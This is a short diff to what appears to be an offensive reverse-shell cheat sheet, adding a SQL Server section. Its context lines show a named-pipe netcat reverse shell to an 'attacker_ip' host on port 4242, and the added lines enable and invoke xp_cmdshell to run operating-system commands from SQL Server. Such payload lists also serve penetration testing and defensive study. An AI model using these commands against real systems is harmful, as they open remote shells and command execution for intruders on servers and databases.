@@ -1172,6 +1172,17 @@ mknod /tmp/backpipe p
 /bin/sh 0</tmp/backpipe | nc attacker_ip 4242 1>/tmp/backpipe
 ```
 
+### SQL Server
+
+```sql
+EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1
+reconfigure;
+xp_cmdshell 'whoami'
+```
+
 ### Socat Reverse Shells
 
 ```bash
